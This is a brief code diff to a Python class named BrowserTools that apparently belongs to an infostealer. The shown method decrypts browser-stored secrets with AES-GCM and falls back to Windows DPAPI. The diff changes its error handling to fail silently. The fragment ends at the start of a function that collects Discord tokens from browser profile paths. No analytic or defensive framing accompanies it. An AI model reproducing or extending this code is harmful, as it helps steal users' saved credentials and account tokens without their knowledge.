@@ -68,9 +68,9 @@ class BrowserTools:
     
     def decrypt(self, data, key):
         try: return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
-        except Exception as e:
+        except:
             try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
-            except Exception as e: print(e); return "Unsupported"
+            except: return "Unsupported"
     
     def get_discord_tokens(self, browsers):
         paths = {b: p for b, p in {
